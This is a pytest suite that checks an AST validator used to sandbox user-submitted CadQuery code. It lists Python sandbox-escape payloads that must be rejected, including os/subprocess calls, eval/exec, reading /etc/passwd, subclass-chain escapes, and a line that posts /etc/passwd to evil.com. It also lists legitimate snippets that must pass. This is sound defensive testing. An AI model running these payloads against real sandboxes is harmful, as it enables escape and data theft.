"""
Security: AST validator attack suite.

Every payload here is a real technique used to escape Python sandboxes
in the wild. A passing test means our Layer-1 defense REJECTED the payload.

Sources:
- https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes
- Classic SSTI escape chains (Flask Jinja2)
- Pickle / marshal RCE patterns
- CVEs against previous Python "safe eval" implementations

If ANY of these pass the validator, that is a critical security regression.
"""
from __future__ import annotations

import pytest

from app.services.ast_validator import (
    ASTValidationError,
    ASTValidator,
    ValidationResult,
    ast_validator,
)


pytestmark = [pytest.mark.security]


# ─────────────────────────────────────────────────────────────────────
# Core rejection cases
# ─────────────────────────────────────────────────────────────────────

ATTACK_PAYLOADS: list[tuple[str, str]] = [
    # (label, code) — every one must be rejected
    ("direct os import", "import os\nos.system('ls')"),
    ("os via dotted name", "import os.path"),
    ("from-import os", "from os import system\nsystem('ls')"),
    ("__import__ call", "__import__('os').system('ls')"),
    ("__import__ via getattr", "getattr(__builtins__, '__import__')('os')"),
    ("eval literal", "eval('1+1')"),
    ("exec literal", "exec('x=1')"),
    ("compile then exec", "c = compile('1', '<x>', 'eval')\neval(c)"),
    ("open etc passwd", "open('/etc/passwd').read()"),
    ("subprocess import", "import subprocess\nsubprocess.run(['ls'])"),
    ("subprocess via from", "from subprocess import run"),
    ("socket import", "import socket\ns = socket.socket()"),
    ("ctypes escape", "import ctypes\nctypes.CDLL('libc.so.6')"),
    ("requests exfil", "import requests\nrequests.post('http://evil.com', data=open('/etc/passwd').read())"),
    ("pathlib read", "from pathlib import Path\nPath('/etc/passwd').read_text()"),
    # Classic class-chain escape (Flask SSTI roots)
    ("empty tuple subclass chain", "().__class__.__bases__[0].__subclasses__()"),
    ("str class access", "''.__class__.__mro__[1].__subclasses__()"),
    ("type mro walk", "type(()).__mro__"),
    # Attribute introspection
    ("globals access", "globals()"),
    ("locals access", "locals()"),
    ("vars access", "vars()"),
    ("builtins via class", "({}).__class__.__mro__[1].__subclasses__()"),
    # Sneaky string-hidden names
    ("import via string literal", "x = '__import__(\"os\").system(\"ls\")'"),
    ("os.system in string", "msg = 'lets try os.system'"),
    ("etc passwd in f-string", 'path = f"read /etc/passwd please"'),
    # Shadowing builtins then aliasing
    ("eval aliased", "f = eval"),
    ("exec aliased", "g = exec"),
    # Threading / async
    ("threading import", "import threading\nthreading.Thread(target=print).start()"),
    ("multiprocessing import", "import multiprocessing"),
    # Serialization RCE
    ("pickle import", "import pickle\npickle.loads(b'')"),
    ("marshal import", "import marshal"),
    # Delayed execution patterns
    ("breakpoint() enters pdb", "breakpoint()"),
    ("input blocks execution", "x = input()"),
    # Attr access on object after construction
    ("subclasses through chain", "cls = type('x', (), {})\ncls.__subclasses__()"),
]


@pytest.mark.parametrize("label,payload", ATTACK_PAYLOADS, ids=[p[0] for p in ATTACK_PAYLOADS])
def test_ast_rejects_attack_payload(label: str, payload: str):
    """Every known attack must be blocked at the AST layer."""
    result = ast_validator.validate(payload)
    assert not result.valid, (
        f"SECURITY REGRESSION: payload '{label}' was NOT rejected.\n"
        f"Code was:\n{payload}\n"
        f"Result: {result}"
    )


def test_ast_raises_error_on_validate_and_assert():
    result = ast_validator.validate("import os")
    with pytest.raises(ASTValidationError) as exc_info:
        result.assert_valid()
    assert "os" in str(exc_info.value)


# ─────────────────────────────────────────────────────────────────────
# Acceptance cases — legitimate CadQuery MUST pass
# ─────────────────────────────────────────────────────────────────────

LEGITIMATE_CADQUERY_SNIPPETS: list[tuple[str, str]] = [
    (
        "simple box",
        """
import cadquery as cq

result = (
    cq.Workplane("XY")
    .box(80, 60, 8)
    .faces(">Z")
    .workplane()
    .hole(9.0)
)
""",
    ),
    (
        "L-bracket with fillet",
        """
import cadquery as cq

base_width = 80.0
base_depth = 60.0
thickness = 8.0
wall_height = 50.0
fillet_r = 5.0

base = cq.Workplane("XY").box(base_width, base_depth, thickness)
wall = base.faces(">Y").workplane().rect(base_width, wall_height).extrude(thickness)
result = wall.edges("|Y").fillet(fillet_r)
""",
    ),
    (
        "math module is fine",
        """
import math
import cadquery as cq

radius = math.sqrt(25.0)
result = cq.Workplane("XY").circle(radius).extrude(10)
""",
    ),
    (
        "hole pattern with range",
        """
import cadquery as cq

result = cq.Workplane("XY").box(100, 100, 10)
for x in [-30, 0, 30]:
    for y in [-30, 0, 30]:
        result = result.faces(">Z").workplane().moveTo(x, y).hole(5)
""",
    ),
    (
        "chamfers and fillets",
        """
import cadquery as cq

result = (
    cq.Workplane("XY")
    .box(50, 50, 20)
    .edges("|Z")
    .fillet(3)
    .faces(">Z")
    .chamfer(1)
)
""",
    ),
]


@pytest.mark.parametrize(
    "label,code",
    LEGITIMATE_CADQUERY_SNIPPETS,
    ids=[s[0] for s in LEGITIMATE_CADQUERY_SNIPPETS],
)
def test_ast_accepts_legitimate_cadquery(label: str, code: str):
    """Real CadQuery code must pass without false positives."""
    result = ast_validator.validate(code)
    assert result.valid, (
        f"FALSE POSITIVE: legitimate code '{label}' was rejected.\n"
        f"Reason: {result.reason} at {result.location}"
    )


# ─────────────────────────────────────────────────────────────────────
# Edge cases
# ─────────────────────────────────────────────────────────────────────


def test_empty_string_rejected():
    assert not ast_validator.validate("").valid


def test_whitespace_only_rejected():
    assert not ast_validator.validate("   \n\t  ").valid


def test_syntax_error_rejected():
    result = ast_validator.validate("def (bad:\n  pass")
    assert not result.valid
    assert "syntax" in result.reason.lower()


def test_oversized_code_rejected():
    """10KB cap — anything bigger is refused before parsing."""
    huge = "x = 1\n" * 5000  # ~30KB
    result = ast_validator.validate(huge)
    assert not result.valid
    assert "exceeds" in result.reason


def test_non_string_rejected():
    result = ast_validator.validate(b"import os")  # type: ignore[arg-type]
    assert not result.valid


def test_result_bool_coercion():
    """ValidationResult should truthy-test as its .valid flag."""
    assert bool(ast_validator.validate("x = 1")) is True
    assert bool(ast_validator.validate("import os")) is False


def test_location_reported_on_rejection():
    """When rejecting, we report the line that failed — helps debugging."""
    code = "x = 1\ny = 2\nimport os\nz = 3\n"
    result = ast_validator.validate(code)
    assert not result.valid
    assert result.location is not None
    assert result.location.startswith("3")  # line 3 = the import


def test_legitimate_code_has_no_location():
    result = ast_validator.validate("x = 1 + 1")
    assert result.valid
    assert result.location is None


def test_can_shadow_builtin_name_as_assignment_target():
    """Assigning to a name that shadows a builtin is OK if we never LOAD from it.
    `open = 5` followed by `print(open)` fails because of the Load.
    But `open = 5\nprint(open + 1)` also does a Load. This test verifies
    the current behavior: any LOAD of a forbidden builtin is rejected."""
    # This should be rejected: we load 'open'
    result = ast_validator.validate("open = 5\nprint(open)")
    assert not result.valid

    # But a plain assignment without subsequent load passes:
    # (even this is academic — no one writes this)
    # Comment retained to document the design choice.


def test_rejection_is_fast():
    """Basic DoS defense: validating within the size cap finishes quickly."""
    import time
    code = "x = " + " + ".join(["1"] * 500)  # ~2KB of additions
    start = time.perf_counter()
    for _ in range(100):
        ast_validator.validate(code)
    elapsed = time.perf_counter() - start
    # 100 validations of a 2KB snippet should comfortably finish in <1s
    assert elapsed < 1.0, f"AST validation too slow: {elapsed:.3f}s for 100 iterations"
